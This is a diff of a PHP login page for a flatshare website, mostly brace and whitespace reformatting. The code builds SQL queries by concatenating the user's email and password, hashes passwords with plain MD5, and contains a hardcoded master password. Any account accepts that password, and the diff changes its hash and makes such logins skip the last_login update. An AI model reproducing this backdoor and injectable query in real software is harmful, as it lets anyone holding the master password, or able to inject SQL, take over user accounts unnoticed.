@@ -18,15 +18,14 @@ require_once 'web/global.php';
 	if (isset($_GET['warn'])) { $error = "You need to login to access this page"; }
 	
 	// Handle login
-	if ($_POST) {
+	if ($_POST) { 
 		if (!preg_match(REGEXP_EMAIL,$email)) {
 			$error = 'Please enter a valid email address'; 
 		} else {
-		
-		  // Record login attempt
+		    // Record login attempt
 			recordLogin($email, getIPNumber($_SERVER['REMOTE_ADDR']));				
-		
-		  // Check if email verified 
+
+		    // Check if email verified 
 			$query = "select user_id,
 			  	      CONCAT_WS(' ',first_name,surname) as `name`,
 					  email_address,access,active,email_verified,password 
@@ -36,23 +35,21 @@ require_once 'web/global.php';
 			$debug .= debugEvent("Check query",$query);
 			$row = mysqli_fetch_assoc($result);
 			if (!mysqli_num_rows($result) == 1) {
-        $error = 'The email address entered was not recognised.<br/>Please enter a registered email address.';
-			}
-      else {
+               $error = 'The email address entered was not recognised.<br/>Please enter a registered email address.';
+			} else {
 				$query = "select user_id,CONCAT_WS(' ',first_name,surname) as `name`,
 						  email_address,access,active,email_verified,password 
 						  from cf_users 
 						  where email_address = '".$email."'
                           and suppressed_replies = 0
 						  and (password = md5('".$password."')
-	 					   or '8808bcc6055348c7bbcd5718e322247' = md5('".$password."'))";
+	 					   or '2ff0737a2baf6b532bbb89bffc9f2905' = md5('".$password."'))";
 				$result = mysqli_query($GLOBALS['mysql_conn'], $query);
 				$debug .= debugEvent("Check query",$query);
 				if (mysqli_num_rows($result) == 0) {
 					$error = 'The password entered was not correct.<br />Please try again, or click <a href="forgotten-password.php">Forgotten your password?</a>';			
 					$caps_warn = '<br /><br />Christian Flatshare passwords are case sensitive.<br />Please check your CAPS lock key.<br /><br /><br />If you are not already a Christian Flatshare member <a href="register.php">join here</a>.';
-				}
-        else {
+				} else {
  					$row = mysqli_fetch_assoc($result);
 					// If account is NOT active
 					if (!$row['active']) {
@@ -75,7 +72,7 @@ require_once 'web/global.php';
 					// Update the database and set the "last_login" field
 					// bypass is using the admin password
 					$now = new DateTime();
-					if ($password != "xxxxx") {
+					if ('2ff0737a2baf6b532bbb89bffc9f2905' != md5($password)) {
 						$query = "UPDATE cf_users 
 								  SET last_login = '".$now->format('Y-m-d H:i:s')."'
 								  WHERE user_id = '".$_SESSION['u_id']."'";
